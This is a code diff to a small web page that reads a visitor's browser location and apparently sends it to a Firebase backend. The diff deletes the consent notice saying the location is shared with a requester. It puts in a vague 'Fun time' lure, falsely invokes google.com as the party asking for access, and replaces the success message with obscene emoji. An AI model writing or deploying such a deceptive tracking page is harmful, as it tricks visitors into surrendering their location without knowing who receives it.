@@ -2,14 +2,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Share Location</title>
+  <title>Fun time</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <div class="container">
-    <h2>Share Your Location</h2>
-    <p>If you allow, your location will be shared with the requester.</p>
-    <button id="shareBtn">Share Location</button>
+    <h2>Thats time is fun.</h2>
+    <p>plase share trun on your location. say google.com </p>
+    <button id="shareBtn">Fun</button>
     <p id="status"></p>
   </div>  <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
@@ -48,9 +48,9 @@
           timestamp
         });
 
-        status.textContent = "✅ Location shared successfully.";
+        status.textContent = "🖕🖕🖕🖕🖕";
       }, error => {
-        status.textContent = "❌ Failed to get location: " + error.message;
+        status.textContent = "google.com did not axis your location.plase try again" + error.message;
         shareBtn.disabled = false;
       });
     };
